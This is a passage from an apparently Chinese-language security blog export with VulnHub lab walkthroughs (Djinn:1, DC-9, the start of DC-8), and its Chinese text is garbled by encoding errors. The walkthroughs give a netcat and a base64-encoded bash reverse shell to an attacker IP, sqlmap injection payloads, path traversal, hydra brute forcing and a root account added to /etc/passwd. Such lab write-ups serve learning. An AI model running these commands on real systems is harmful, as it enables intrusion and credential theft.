/><p>åŒ¿åç™»é™†ä¹‹åï¼Œä¸‹è½½ä¸‰ä¸ªæ–‡ä»¶çœ‹çœ‹</p><img src="Djinn:1/image-20200718153542804.png" alt="image-20200718153542804" style="zoom:25%;" /><h2 id="7331"><a href="#7331" class="headerlink" title="7331"></a>7331</h2><p>æ˜¯ä¸€ä¸ªhttpç«¯å£</p><img src="Djinn:1/image-20200718153726596.png" alt="image-20200718153726596" style="zoom:25%;" /><p>æ‰«æä¸€ä¸‹ï¼Œå¾—åˆ°ä¸¤ä¸ªç›®å½•<code>/wish</code>å’Œ<code> /genie</code></p><img src="Djinn:1/image-20200718173347887.png" alt="image-20200718173347887" style="zoom:25%;" /><p>è¾“å…¥lsï¼Œå¾—åˆ°çš„é¡µé¢å‡ºç°äº†ç›®å½•åˆ—è¡¨</p><img src="Djinn:1/image-20200718173841552.png" alt="image-20200718173841552" style="zoom:25%;" /><img src="Djinn:1/image-20200718173851608.png" alt="image-20200718173851608" style="zoom:25%;" /><p>è¯•è¯•å¼¹ä¸€ä¸ªwebshell</p><p><code>nc -e /bin/bash 192.168.2.143 8848</code></p><img src="Djinn:1/image-20200718173946396.png" alt="image-20200718173946396" style="zoom:25%;" /><p>åº”è¯¥æ˜¯åšäº†è¿‡æ»¤ï¼Œä¸æ‡‚æ€ä¹ˆç»•è¿‡</p><p>ï¼ˆç¿»å‚è€ƒç­”æ¡ˆå»äº†ï¼‰</p><h2 id="ä½¿ç”¨base64ç»•è¿‡"><a href="#ä½¿ç”¨base64ç»•è¿‡" class="headerlink" title="ä½¿ç”¨base64ç»•è¿‡"></a>ä½¿ç”¨base64ç»•è¿‡</h2><img src="Djinn:1/image-20200718191903547.png" alt="image-20200718191903547" style="zoom:25%;" /><p>ç„¶ååœ¨executeé‡Œé¢è¾“å…¥<code>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTQzLzg4NDggMD4mMQ== | base64 -d | bash</code> å³å¯å¾—åˆ°ä¸€ä¸ªåå¼¹shell</p><img src="Djinn:1/image-20200718192017136.png" alt="image-20200718192017136" style="zoom:25%;" /><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æŸ¥çœ‹ä¸€ä¸‹<code>/home</code></p><img src="Djinn:1/image-20200718192113475.png" alt="image-20200718192113475" style="zoom:25%;" /><p>å‘ç°<code>nitush</code>æ˜¯å¯ä»¥è¯»çš„ï¼Œä¸‹é¢æœ‰ä¸€ä¸ª<code>user.txt</code>ï¼Œä½†æ˜¯è¯»ä¸äº†ï¼Œåªæœ‰<code>.dev(ç›®å½•)</code> å’Œ<code>.bashrc(æ–‡ä»¶)</code>æ˜¯å¯ä»¥è¯»çš„ï¼Œçœ‹ä¸€ä¸‹<code>.dev</code>é‡Œé¢æœ‰å•¥</p><img src="Djinn:1/image-20200718192411442.png" alt="image-20200718192411442" style="zoom:25%;" /><p>å‘ç°æœ‰ä¸€ä¸ªå¯ä»¥è¯»å–çš„æ–‡ä»¶<code>creds.txt</code>ï¼Œè¯»å–ä¸€ä¸‹</p><img src="Djinn:1/image-20200718192503004.png" alt="image-20200718192503004" style="zoom:25%;" /><p>å¾—åˆ°äº†nitishçš„å¯†ç <code>p4ssw0rdStr3r0n9</code>ï¼Œåˆ‡æ¢åˆ°nitish</p><img src="Djinn:1/image-20200718192549436.png" alt="image-20200718192549436" style="zoom:25%;" /><p>éœ€è¦æå‡shellï¼Œç”¨pythonçš„ptyå³å¯</p><img src="Djinn:1/image-20200718192650192.png" alt="image-20200718192650192" style="zoom:25%;" /><p>è¯»å–<code>user.txt</code>å‘ç°æ²¡æœ‰å•¥ç”¨ï¼ˆåº”è¯¥æ˜¯flagä¸­çš„ä¸€ä¸ªï¼‰</p><p>çœ‹ä¸€ä¸‹èƒ½ç”¨äºææƒçš„ä¸œè¥¿</p><img src="Djinn:1/image-20200718192802095.png" alt="image-20200718192802095" style="zoom:25%;" /><p><code>genie</code>æ˜¯å•¥ï¼Œman çœ‹ä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">genie [-h] [-g] [-p SHELL] [-e EXEC] wish</span><br><span class="line">è¿˜æœ‰ä¸€ä¸ª -cmd</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§ä»–çš„è¯´æ³•ï¼Œå¯ä»¥ä½¿ç”¨ <code>-p &quot;/bin/bash&quot;</code>ï¼Œå‘ç°å¹¶æ²¡æœ‰åµç”¨ï¼Ÿ</p><p>è¿˜è¯´å¯ä»¥<code>-e exec</code>è¯•è¯•çœ‹<code>-e /bin/bash</code></p><img src="Djinn:1/image-20200718193412986.png" alt="image-20200718193412986" style="zoom:25%;" /><p>å†è¯•è¯•<code>-cmd</code></p><img src="Djinn:1/image-20200718193604801.png" alt="image-20200718193604801" style="zoom:25%;" /><p>å‘ç°ç¡®å®å¯ä»¥äº†</p><p>å†çœ‹çœ‹èƒ½ææƒçš„ä¸œè¥¿</p><img src="Djinn:1/image-20200718193651732.png" alt="image-20200718193651732" style="zoom:25%;" /><p>è¿è¡Œä¸€ä¸‹çœ‹çœ‹</p><img src="Djinn:1/image-20200718193739836.png" alt="image-20200718193739836" style="zoom:25%;" /><p>ï¼ˆåˆå»ç¿»å‚è€ƒç­”æ¡ˆäº†ï¼‰</p><p>è¯´æ˜¯<code>~/.pyc</code>æ–‡ä»¶å°±æ˜¯è¿™ä¸ªæ–‡ä»¶çš„åŸå‹ï¼ˆæƒ³ä¸åˆ°å•Šæƒ³ä¸åˆ°ï¼Œä½†æ˜¯ä¸ºå•¥å‘¢ï¼‰</p><img src="Djinn:1/image-20200718194118697.png" alt="image-20200718194118697" style="zoom:25%;" /><p>ï¼ˆè¿™äº›å­—ç¬¦æœ‰äº›æ˜¯å‡ºç°åœ¨åˆšåˆšçš„ç¨‹åºé‡Œé¢çš„ï¼‰</p><p>.pycæ–‡ä»¶æ‰¾ä¸€ä¸ªåœ¨çº¿ç½‘ç«™åç¼–è¯‘pythonå°±è¡Œ</p><img src="Djinn:1/image-20200718194246226.png" alt="image-20200718194246226" style="zoom:25%;" /><p>è¦ä¹ˆæœ‰1/100çš„æ¦‚ç‡ä¸­ï¼Œè¦ä¹ˆå°±æ˜¯<a href="https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/">python2 <code>input</code>å‡½æ•°å­˜åœ¨çš„ä¸€ä¸ªæ¼æ´</a></p><p>æ‰€ä»¥è¾“å…¥numå°±èƒ½é€šè¿‡éªŒè¯</p><img src="Djinn:1/image-20200718194457671.png" alt="image-20200718194457671" style="zoom:25%;" />]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> Djinn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> ftp </tag>
            
            <tag> command-injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub DC-8é¶æœº</title>
      <link href="/DC-9.html"/>
      <url>/DC-9.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ DC-8 é¶æœº</p><p>åˆå­¦è€…éš¾åº¦</p><a id="more"></a><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="DC9"><a href="#DC9" class="headerlink" title="DC9"></a>DC9</h1><h2 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/Desktop/postsql# nmap -Pn 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.2.160</span><br><span class="line">Host is up (0.00061s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE    SERVICE</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open     http</span><br></pre></td></tr></table></figure><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/Desktop/postsql# nmap -Pn 192.168.2.160 -A -p0-65535</span><br><span class="line"></span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open     http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Example.com - Staff Details - Welcome</span><br><span class="line">MAC Address: 00:0C:29:2C:6E:29 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure><p>å¼€å¯äº†<code>ssh</code> <code>http</code> ä¸¤ä¸ªç«¯å£</p><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>è®¿é—®<code>http://192.168.2.160</code></p><p><img src="./DC-9/image-20200709131034952.png" alt="image-20200709131034952"></p><p>åœ¨<code>search</code> é¡µé¢æŠ“åŒ…ï¼Œ</p><p><img src="./DC-9/image-20200709131119588.png" alt="image-20200709131119588"></p><p>è§‰å¾—å¯èƒ½å­˜åœ¨<code>sqlæ³¨å…¥</code>ï¼Œä¸Š<code>sqlmap</code></p><p>ç”±äºæ˜¯<code>postå‹</code>ï¼Œå…ˆä¿å­˜åˆ°æ–‡ä»¶</p><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/Desktop/postsql# sqlmap -r 1.txt </span><br><span class="line"></span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: search (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: search=a&#x27; AND (SELECT 5206 FROM (SELECT(SLEEP(5)))mBIG) AND &#x27;EUSQ&#x27;=&#x27;EUSQ</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 6 columns</span><br><span class="line">    Payload: search=a&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a787671,0x66647275534a554379564a566644746a68634655465746746f764d4a496850544c4c7a4b4b696144,0x7171786271),NULL,NULL-- -</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ³¨å…¥ï¼Œé‚£ç»§ç»­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dbs:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] Staff</span><br><span class="line">[*] users</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/Desktop/postsql# sqlmap -r 1.txt -D Staff,users --tables</span><br><span class="line"></span><br><span class="line">Database: Staff</span><br><span class="line">[2 tables]</span><br><span class="line">+--------------+</span><br><span class="line">| StaffDetails |</span><br><span class="line">| Users        |</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line">Database: users</span><br><span class="line">[1 table]</span><br><span class="line">+--------------+</span><br><span class="line">| UserDetails  |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/Desktop/postsql# sqlmap -r 1.txt -D users -T UserDetails --columns</span><br><span class="line"></span><br><span class="line">+-----------+-----------------+</span><br><span class="line">| Column    | Type            |</span><br><span class="line">+-----------+-----------------+</span><br><span class="line">| id        | int(6) unsigned |</span><br><span class="line">| password  | varchar(20)     |</span><br><span class="line">| firstname | varchar(30)     |</span><br><span class="line">| lastname  | varchar(30)     |</span><br><span class="line">| reg_date  | timestamp       |</span><br><span class="line">| username  | varchar(30)     |</span><br><span class="line">+-----------+-----------------+</span><br></pre></td></tr></table></figure><img src="DC-9/image-20200709132217205.png" alt="image-20200709132217205" style="zoom:50%;" /><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>å°è¯•sshè¿æ¥ä¸Šå»ï¼Œå´å¤±è´¥äº†ã€‚</p><img src="DC-9/image-20200709132316634.png" alt="image-20200709132316634" style="zoom:50%;" /><p>çœ‹åˆ°ä¸Šé¢ç«¯å£æ‰«æçš„æ—¶å€™ï¼Œsshæ˜¾ç¤ºçš„<code>filered</code></p><p>ç„¶åå°±æ˜¯ç¿»äº†ä¸€ä¸‹åˆ«äººçš„wp</p><img src="DC-9/image-20200709132537229.png" alt="image-20200709132537229" style="zoom:50%;" /><p>ä¹Ÿå°±æ˜¯è¯´éœ€è¦å…ˆè¯»åˆ°è¿™ä¸ªæ–‡ä»¶ã€‚</p><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>å›åˆ°sqlï¼Œè¿˜æœ‰ä¸€å¼ è¡¨æ²¡æœ‰çœ‹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/Desktop/postsql# sqlmap -r 1.txt -D Staff -T Users --columns</span><br><span class="line"></span><br><span class="line">+----------+-----------------+</span><br><span class="line">| Column   | Type            |</span><br><span class="line">+----------+-----------------+</span><br><span class="line">| Password | varchar(255)    |</span><br><span class="line">| UserID   | int(6) unsigned |</span><br><span class="line">| Username | varchar(255)    |</span><br><span class="line">+----------+-----------------+</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/Desktop/postsql# sqlmap -r 1.txt -D Staff -T Users -C Username,Password --dump</span><br><span class="line"></span><br><span class="line">[INFO] recognized possible password hashes in column &#x27;`Password`&#x27;</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ªhashï¼Œä½¿ç”¨sqlmapè‡ªå¸¦çš„çˆ†ç ´åŠŸèƒ½</p><p><img src="DC-9/image-20200709131623559.png" alt="image-20200709131623559"></p><p>å¾—åˆ°äº†adminçš„å¯†ç ï¼Œå›åˆ°http</p><img src="DC-9/image-20200709131749113.png" alt="image-20200709131749113" style="zoom:50%;" /><p>å·¦ä¸‹è§’å‡ºç°<code>File does not exist</code>ï¼ŒçŒœæµ‹æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´</p><p>ä½¿ç”¨<code>?file=../../../../../etc/passwd</code>è¯•è¯•ï¼ˆä¸­é—´../å¤šä¸€ç‚¹æ²¡å…³ç³»ï¼‰</p><img src="DC-9/image-20200709131916088.png" alt="image-20200709131916088" style="zoom:50%;" /><p>ï¼ˆå›¾ä¸­æœ€åçš„stdoutæ˜¯æˆ‘åæ¥ææƒçš„æ—¶å€™å†™ä¸Šå»çš„ï¼‰</p><p>åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œè¯»åˆ°<code>/etc/knockd.conf</code>æ–‡ä»¶ï¼Œ</p><img src="DC-9/image-20200709132726736.png" alt="image-20200709132726736" style="zoom:50%;" /><p>éœ€è¦å…ˆæ•²é—¨è¿™ä¸‰ä¸ªç«¯å£</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/Desktop/postsql# nmap -p7469 192.168.2.160</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-09 01:28 EDT</span><br><span class="line">Nmap scan report for 192.168.2.160</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">7469/tcp closed unknown</span><br><span class="line">MAC Address: 00:0C:29:2C:6E:29 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds</span><br><span class="line">root@kali:/home/kali/Desktop/postsql# nmap -p8475 192.168.2.160</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-09 01:28 EDT</span><br><span class="line">Nmap scan report for 192.168.2.160</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">8475/tcp closed unknown</span><br><span class="line">MAC Address: 00:0C:29:2C:6E:29 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds</span><br><span class="line">root@kali:/home/kali/Desktop/postsql# nmap -p9842 192.168.2.160</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-09 01:28 EDT</span><br><span class="line">Nmap scan report for 192.168.2.160</span><br><span class="line">Host is up (0.00051s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">9842/tcp closed unknown</span><br><span class="line">MAC Address: 00:0C:29:2C:6E:29 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds</span><br><span class="line">root@kali:/home/kali/Desktop/postsql# nmap 192.168.2.160 -p22</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-09 01:28 EDT</span><br><span class="line">Nmap scan report for 192.168.2.160</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">MAC Address: 00:0C:29:2C:6E:29 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds</span><br></pre></td></tr></table></figure><p>å‘ç°22ç«¯å£çš„ssh openäº†</p><p>ä½¿ç”¨sshè¿ï¼Œå‘ç°ä¸å¯¹</p><img src="DC-9/image-20200709133024619.png" alt="image-20200709133024619" style="zoom:50%;" /><p>çŒœæµ‹å¯èƒ½æ˜¯åæ¥ä¿®æ”¹è¿‡å¯†ç ï¼Œå°è¯•çˆ†ç ´ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æ²¡ä¿®æ”¹å¯†ç çš„æ¼ç½‘ä¹‹é±¼</p><h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><p>æŠŠuser å’Œ passwd åˆ†åˆ«æ”¾å…¥ä¸¤ä¸ªæ–‡ä»¶ä¸­ï¼Œä½¿ç”¨hydraå·¥å…·çˆ†ç ´</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/DC9$ hydra -L user.txt -P passwd.txt 192.168.2.160 ssh</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.2.160   login: chandlerb   password: UrAG0D!</span><br><span class="line">[22][ssh] host: 192.168.2.160   login: joeyt   password: Passw0rd</span><br><span class="line">[22][ssh] host: 192.168.2.160   login: janitor   password: Ilovepeepee</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°ä¸‰ä¸ªï¼Œè¿æ¥ä¸Šå»</p><img src="DC-9/image-20200709133429774.png" alt="image-20200709133429774" style="zoom:50%;" /><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>åœ¨éå†äº†å‰é¢ä¸¤ä¸ªè´¦æˆ·ä¹‹åï¼Œå¹¶æ²¡æœ‰å‘ç°æœ‰ç”¨çš„ä¿¡æ¯</p><p>ä½†æ˜¯ç¬¬ä¸‰ä¸ªæœ‰</p><img src="DC-9/image-20200709133601007.png" alt="image-20200709133601007" style="zoom:50%;" /><img src="DC-9/image-20200709133614969.png" alt="image-20200709133614969" style="zoom:50%;" /><p>åº”è¯¥æ˜¯åˆ«äººçš„å¯†ç ï¼ŒåŠ åˆ°passwd.txt é‡Œé¢ï¼Œå†ä¸€æ¬¡çˆ†ç ´</p><p>å‘ç°å¤šäº†ä¸€æ¡</p><img src="DC-9/image-20200709133724745.png" alt="image-20200709133724745" style="zoom:50%;" /><p>ä½¿ç”¨è¿™ä¸ªæ–°çš„ç™»é™†</p><p>ä½¿ç”¨<code>sudo -l</code> </p><img src="DC-9/image-20200709133816001.png" alt="image-20200709133816001" style="zoom:50%;" /><p>åº”è¯¥å°±æ˜¯è¦ç”¨è¿™ä¸ªäº†ï¼Œè¿™ä¸ªæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åæ€ä¹ˆåŠæˆ‘å°±ä¸çŸ¥é“äº†</p><p>ï¼ˆå·çœ‹å‚è€ƒç­”æ¡ˆï¼Œè¯´æ˜¯è¿è¡Œäº†ä¸€ä¸ª<code>../../test.py</code>ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿï¼‰</p><p><img src="DC-9/image-20200709133947723.png" alt="image-20200709133947723"></p><p>åæ­£å°±æ˜¯èƒ½ä»¥rootæ–¹å¼å†™æ–‡ä»¶äº†</p><p>é‚£å°±å†™<code>/etc/passwd</code>å‘—</p><p>ä½¿ç”¨<code>openssl</code>å·¥å…·ç”Ÿæˆä¸€ä¸ª</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ openssl passwd -1 -salt stdout 1111</span><br><span class="line"><span class="meta">$</span><span class="bash">1$stdout<span class="variable">$FfWrpUtX8XO1tpysFmaKg</span>/</span></span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠè¿™ä¸ªechoåˆ°/tmpæ–‡ä»¶å¤¹ä¸‹é¢</p><p>ä½¿ç”¨testæ–‡ä»¶ä¿®æ”¹<code>/etc/passwd</code>,åˆ‡æ¢åˆ°stdoutå°±å¯ä»¥äº†</p><img src="DC-9/image-20200709134219093.png" alt="image-20200709134219093" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> DC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> sql-injection </tag>
            
            <tag> file-including </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub DC-8é¶æœº</title>
      <link href="/DC-8.html"/>
      <url>/DC-8.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ DC-8 é¶æœº</p><p>åˆå­¦è€…éš¾åº¦</p><a id="more"></a><h1 id="DC-8"><a href="#DC-8" class="headerlink" title="DC-8"></a>DC-8</h1><h2 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/ex# nmap -Pn 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.2.158</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:D6:59:23 (VMware)</span><br></pre></td></tr></table></figure><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/ex# nmap -Pn -A 192.168.2.158 -p0-65535</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)</span><br><span class="line">|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)</span><br><span class="line">|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Welcome to DC-8 | DC-8</span><br></pre></td></tr></table></figure><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><img src="./DC-8/image-20200706175716586.png" alt="image-20200706175716586" style="zoom:50%;" /><p>ç‚¹å‡»å·¦ä¾§çš„é“¾æ¥æ ä¹‹åï¼Œä¸Šé¢çš„<code>url</code>å‡ºç°äº†<code>?nid=1</code>ï¼ŒçŒœæµ‹å­˜åœ¨<code>sql</code>æ³¨å…¥</p><p>ä½¿ç”¨<code>?nid=1&#39; or 1=1</code> æ¢æµ‹ï¼Œå‘ç°å´©æºƒ</p><img src="./DC-8/image-20200706175905686.png" alt="image-20200706175905686" style="zoom:50%;" /><p>sqlè¯­å¥æš´éœ²ï¼Œæ˜æ˜¾å­˜åœ¨æ³¨å…¥ç‚¹</p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 